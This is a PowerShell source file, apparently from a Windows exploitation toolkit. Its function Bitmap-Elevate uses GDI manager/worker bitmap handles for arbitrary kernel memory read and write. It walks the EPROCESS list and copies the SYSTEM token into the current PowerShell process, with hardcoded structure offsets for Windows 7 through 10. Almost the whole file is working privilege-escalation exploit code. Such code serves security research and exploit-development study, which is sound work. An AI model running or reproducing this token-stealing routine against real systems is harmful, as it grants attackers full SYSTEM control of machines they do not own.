function Bitmap-Elevate {
<#
.SYNOPSIS
	A token stealing wrapper for x32/64 which ingests a handle to a manager and worker bitmap.

	Note that this function has two methods, if supplied with a pointer to an arbitrary tagTHREADINFO object it can elevate the current process from low integrity. Without the tagTHREADINFO pointer it relies on NtQuerySystemInformation (Get-LoadedModules) to leak the base address of the ntkernel which requires medium integrity on Win8.1+.

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER ManagerBitmap
	Handle to manager bitmap.

.PARAMETER WorkerBitmap
	Handle to worker bitmap.

.PARAMETER ThreadInfo
	Optional pointer to tagTHREADINFO (Int64/Int32).

.EXAMPLE
	# MedIL token theft
	C:\PS> Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle

	# LowIL token theft
	C:\PS> Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle -ThreadInfo $ManagerBitmap.tagTHREADINFO
#>
	param(
		[Parameter(Mandatory = $True)]
		[IntPtr]$ManagerBitmap,
		[Parameter(Mandatory = $True)]
		[IntPtr]$WorkerBitmap,
		[Parameter(Mandatory = $False)]
		$ThreadInfo
	)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class BitmapElevate
	{
		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool FreeLibrary(
			IntPtr hModule);
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
	}
"@

	# Flag architecture $x32Architecture/!$x32Architecture
	if ([System.IntPtr]::Size -eq 4) {
		$x32Architecture = 1
	}

	# Arbitrary Kernel read
	function Bitmap-Read {
		param ($Address)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
		$CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
		if ($x32Architecture){
			[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
		} else {
			[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
		}
		$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
	}
	
	# Arbitrary Kernel write
	function Bitmap-Write {
		param ($Address, $Value)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		$CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
	}

	# Parse EPROCESS list
	function Traverse-EPROCESS {
		param($EPROCESS,$TargetPID)
		echo "[+] Traversing ActiveProcessLinks list"
		$NextProcess = $(Bitmap-Read -Address $($EPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
		while($true) {
			$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
			if ($NextPID -eq $TargetPID) {
				echo "[+] PID: $NextPID"
				echo "[+] Token Address: 0x$("{0:X}" -f $($NextProcess+$TokenOffset))"
				echo "[+] Token Value: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
				$HashTable = @{
					TokenAddress = $NextProcess+$TokenOffset
					TokenValue = Bitmap-Read -Address $($NextProcess+$TokenOffset)
				}
				$Script:TokenObject = New-Object PSObject -Property $HashTable
				break
			}
			$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
		}
	}
	
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{
			if(!$x32Architecture){
				if($OSVersion.Build -lt 15063){
					$KthreadEprocess = 0x220
					$UniqueProcessIdOffset = 0x2e8
					$TokenOffset = 0x358          
					$ActiveProcessLinks = 0x2f0
				} else {
					$KthreadEprocess = 0x220
					$UniqueProcessIdOffset = 0x2e0
					$TokenOffset = 0x358          
					$ActiveProcessLinks = 0x2e8
				}
			} else {
				if($OSVersion.Build -lt 15063){
					$KthreadEprocess = 0x150
					$UniqueProcessIdOffset = 0xb4
					$TokenOffset = 0xf4          
					$ActiveProcessLinks = 0xb8
				} else {
					$KthreadEprocess = 0x150
					$UniqueProcessIdOffset = 0xb4
					$TokenOffset = 0xfc          
					$ActiveProcessLinks = 0xb8
				}
			}
		}
		
		'6.3' # Win8.1 / 2k12R2
		{
			if(!$x32Architecture){
				$KthreadEprocess = 0x220
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			} else {
				$KthreadEprocess = 0x150
				$UniqueProcessIdOffset = 0xb4
				$TokenOffset = 0xec          
				$ActiveProcessLinks = 0xb8
			}
		}
		
		'6.2' # Win8 / 2k12
		{
			if(!$x32Architecture){
				$KthreadEprocess = 0x220
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			} else {
				$KthreadEprocess = 0x150
				$UniqueProcessIdOffset = 0xb4
				$TokenOffset = 0xec          
				$ActiveProcessLinks = 0xb8
			}
		}
		
		'6.1' # Win7 / 2k8R2
		{
			if(!$x32Architecture){
				$KthreadEprocess = 0x210
				$UniqueProcessIdOffset = 0x180
				$TokenOffset = 0x208          
				$ActiveProcessLinks = 0x188
			} else {
				$KthreadEprocess = 0x150
				$UniqueProcessIdOffset = 0xb4
				$TokenOffset = 0xf8          
				$ActiveProcessLinks = 0xb8
			}
		}
	}

	if ($ThreadInfo) {
		echo "`n[>] LowIL compatible leak!"
		echo "[+] tagTHREADINFO 0x$("{0:X}" -f $ThreadInfo)"
		$Kthread = Bitmap-Read -Address $ThreadInfo
		echo "[+] KTHREAD: 0x$("{0:X}" -f $Kthread)"
		$Eprocess = Bitmap-Read -Address $($Kthread+$KthreadEprocess)
		echo "[+] PowerShell _EPROCESS: 0x$("{0:X}" -f $Eprocess)"
		$PoShTokenAddr = $Eprocess+$TokenOffset
		echo "`n[>] Leaking SYSTEM _EPROCESS.."
		Traverse-EPROCESS -EPROCESS $Eprocess -TargetPID 4
		echo "`n[!] Duplicating SYSTEM token!`n"
		Bitmap-Write -Address $PoShTokenAddr -Value $TokenObject.TokenValue
	} else {
		echo "`n[>] MediumIL compatible leak!"
		$SystemModuleArray = Get-LoadedModules
		$KernelBase = $SystemModuleArray[0].ImageBase
		echo "[+] Kernel base: 0x$("{0:X}" -f $KernelBase)"
		$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
		$KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType")
		$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
		$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
		echo "[+] PsInitialSystemProcess: 0x$("{0:X}" -f $SysEprocessPtr)"
		$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
		$Eprocess = Bitmap-Read -Address $SysEprocessPtr
		echo "[+] SYSTEM _EPROCESS: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
		$SysToken = Bitmap-Read -Address $($Eprocess+$TokenOffset)
		echo "`n[>] Leaking PowerShell _EPROCESS.."
		Traverse-EPROCESS -EPROCESS $Eprocess -TargetPID $PID
		echo "`n[!] Duplicating SYSTEM token!`n"
		Bitmap-Write -Address $TokenObject.TokenAddress -Value $SysToken
	}
}